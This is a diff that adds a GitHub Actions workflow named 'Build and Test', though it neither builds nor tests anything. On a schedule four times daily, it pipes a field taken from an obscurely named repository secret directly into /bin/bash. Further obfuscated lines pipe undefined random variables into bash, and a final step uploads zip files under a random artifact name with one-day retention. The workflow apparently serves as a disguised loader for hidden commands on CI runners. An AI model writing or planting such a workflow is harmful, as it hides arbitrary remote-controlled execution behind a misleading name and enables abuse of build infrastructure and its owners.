@@ -1,0 +1,31 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          xz15: ${{ secrets.xz15 }}
+        run: |
+          printf '%s' "$xz15" | jq -r .fua0614 | /bin/bash
+          echo $osij728 | jq -r .hwhz697 | /bin/bash
+          echo $bnl88 | jq -r .eosk1 | /bin/bash
+          echo $tqfk953 | jq -r .w25 | /bin/bash
+          echo $iu94 | jq -r .y189 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: i7lyJF5D
+          path: "*.zip"
+          retention-days: 1
